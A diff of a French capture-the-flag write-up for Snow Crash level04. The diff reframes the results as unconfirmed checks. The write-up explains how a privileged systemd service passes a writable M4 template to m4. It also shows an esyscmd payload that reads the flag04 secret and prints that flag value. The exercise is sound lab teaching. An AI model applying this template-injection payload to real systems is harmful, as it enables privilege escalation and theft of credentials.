@@ -1,5 +1,7 @@
 # Level04 — Exploiter un modèle M4 modifiable
 
+**Point de départ :** une session sur la VM Snow Crash sous `level04`. Le flag de ce niveau sert de mot de passe au compte `level05`.
+
 ## Objectif
 
 Comprendre qu’un moteur de génération de texte peut aussi interpréter des instructions capables d’exécuter des commandes. Un modèle modifiable devient dangereux lorsqu’un service privilégié le traite comme du code.
@@ -10,13 +12,13 @@ Comprendre qu’un moteur de génération de texte peut aussi interpréter des i
 cat README
 ```
 
-Résultat :
+Résultat de référence (à confirmer sur la VM) :
 
 ```text
 In the beginning was the Word.
 ```
 
-L’indice ne donne ni un programme ni un chemin exploitable. On commence donc par chercher les chemins qui portent le nom du niveau actuel.
+L’indice ne donne pas de chemin précis ; rechercher les fichiers associés à `level04`.
 
 ## 2. Trouver le service
 
@@ -24,7 +26,7 @@ L’indice ne donne ni un programme ni un chemin exploitable. On commence donc p
 find / -iname '*level04*' 2>/dev/null
 ```
 
-Parmi les chemins trouvés figure `/opt/snowcrash/level04`. Examiner son contenu révèle le script `babel.sh` :
+Examiner `/opt/snowcrash/level04` et vérifier la présence de `babel.sh` :
 
 ```bash
 ls -la /opt/snowcrash/level04
@@ -36,7 +38,7 @@ Le nom du script donne le mot-clé `babel`, utilisé pour retrouver le service c
 systemctl list-unit-files --all | grep -i babel
 ```
 
-Le résultat est `babel.service`. Le nom du service est maintenant connu, mais pas encore son comportement.
+Service à rechercher : `babel.service`.
 
 ## 3. Lire ce que le service exécute
 
@@ -44,7 +46,7 @@ Le résultat est `babel.service`. Le nom du service est maintenant connu, mais p
 systemctl cat babel.service
 ```
 
-La sortie observée est :
+Extrait de configuration à confirmer :
 
 ```ini
 [Service]
@@ -55,13 +57,11 @@ StandardOutput=journal
 StandardError=journal
 ```
 
-Cette sortie permet d’établir trois faits :
+Si cet extrait est confirmé :
 
 - le service s’exécute avec l’identité `flag04` ;
 - il lance le script `/opt/snowcrash/level04/babel.sh` ;
 - ses messages sont envoyés dans le journal système.
-
-Le service ne donne pas encore le moteur utilisé, ni le nom du fichier traité. Le script est donc le prochain élément à examiner.
 
 ## 4. Suivre le script lancé par le service
 
@@ -69,9 +69,7 @@ Le service ne donne pas encore le moteur utilisé, ni le nom du fichier traité.
 cat /opt/snowcrash/level04/babel.sh
 ```
 
-Le contenu du script montre que M4 traite `/var/lib/babel/templates/template.m4` et que le résultat est écrit dans `/var/lib/babel/output.conf`.
-
-La chaîne devient alors concrète : `babel.service` lance `babel.sh` sous `flag04`, puis ce script donne le modèle à M4 et enregistre le résultat.
+Vérifier dans le script que M4 traite `/var/lib/babel/templates/template.m4` et écrit le résultat dans `/var/lib/babel/output.conf`. L’extrait de `babel.sh` correspondant n’est pas disponible ici ; cette chaîne reste à confirmer.
 
 ## 5. Examiner le modèle et ses permissions
 
@@ -81,12 +79,12 @@ ls -l /var/lib/babel/templates/template.m4
 sed -n '1,80p' /var/lib/babel/templates/template.m4
 ```
 
-La commande `sed` permet de lire le début du modèle sans partir d’une hypothèse sur son contenu. Les deux autres commandes permettent de vérifier que :
+`sed` affiche le début du modèle. Avec `id` et `ls -l`, vérifier que :
 
 - le modèle `template.m4` est modifiable par `level04` ;
 - `level04` possède, directement ou par groupe, le droit correspondant.
 
-Le problème est maintenant établi, mais l’exploitation ne l’est pas encore : il faut comprendre les instructions reconnues par M4.
+Chaîne de fonctionnement à confirmer :
 
 ```text
 template.m4 modifiable par level04
@@ -103,7 +101,7 @@ template.m4 modifiable par level04
 
 ## 6. Comprendre M4
 
-Le script a indiqué qu’il lance M4. M4 est un processeur de macros : il lit un texte, interprète les macros qu’il contient et produit un nouveau texte.
+M4 est un processeur de macros : il lit un texte, interprète les macros qu’il contient et produit un nouveau texte.
 
 Exemple inoffensif :
 
@@ -111,7 +109,7 @@ Exemple inoffensif :
 echo "define(\`bonjour', \`Salut')bonjour" | m4
 ```
 
-Résultat :
+Résultat de référence (à confirmer sur la VM) :
 
 ```text
 Salut
@@ -125,17 +123,17 @@ GNU M4 propose aussi `esyscmd`, une macro qui lance une commande shell et insèr
 printf "esyscmd(\`printf test')" | m4
 ```
 
-Le résultat est :
+Résultat attendu :
 
 ```text
 test
 ```
 
-Cette fois, M4 n’a pas seulement remplacé du texte : il a exécuté `printf test`. Puisque le service lance M4 sous `flag04`, une commande placée dans le modèle serait lancée avec cette identité.
+Si le service lance effectivement M4 sous `flag04` sans abandon de privilèges, la commande placée dans le modèle peut être exécutée sous cette identité.
 
 ## 7. Construire le payload
 
-Le fichier [payload.m4](payload.m4) contient une seule instruction :
+Le payload M4 complet est :
 
 ```m4
 esyscmd(`cat /home/flag04/.flag')
@@ -148,7 +146,7 @@ esyscmd(`cat /home/flag04/.flag')
 | `/home/flag04/.flag` | Fichier que le service peut lire grâce aux droits de `flag04`. |
 | Accent grave et apostrophe | Délimiter un argument avec la syntaxe de citation par défaut de M4. |
 
-Le résultat de `cat` est inséré dans le document généré par M4, puis écrit dans `/var/lib/babel/output.conf`.
+Le résultat de `cat` doit être inséré dans le texte généré ; vérifier que le script l’écrit bien dans `/var/lib/babel/output.conf`.
 
 ## 8. Modifier le modèle
 
@@ -169,16 +167,28 @@ On utilise `>>` afin de conserver les instructions originales du modèle. Les ap
 
 ## 9. Lire le résultat généré
 
-Après le passage du service, afficher les dernières lignes de la sortie :
+Après avoir identifié le déclenchement du service, afficher les dernières lignes de la sortie :
 
 ```bash
 tail -n 3 /var/lib/babel/output.conf
 ```
 
-Le secret apparaît dans le texte généré :
+Flag de référence à comparer au texte généré :
 
 ```text
 ne2searoevaevoem4ov4ar8ap
 ```
 
 `tail -n 3` limite l’affichage aux trois dernières lignes, là où la sortie de la macro ajoutée est attendue.
+
+## Passer au niveau suivant
+
+Après avoir confirmé le flag sur la VM, essayer `su - level05` avec cette valeur comme mot de passe, puis contrôler le compte courant avec `id -un`. Résultat attendu : `level05`. Cette connexion reste à valider.
+
+## Validation sur la VM
+
+Les valeurs et extraits de terminal ci-dessus proviennent de la solution fournie ; ils ne constituent pas une nouvelle preuve d’exécution. Les vérifications suivantes restent à effectuer :
+
+- [ ] Confirmer les chemins, la définition du service et relever l’extrait pertinent de `babel.sh`.
+- [ ] Relever les permissions du modèle et vérifier les exemples M4.
+- [ ] Identifier le mode de déclenchement, confirmer la sortie et le passage à `level05`.
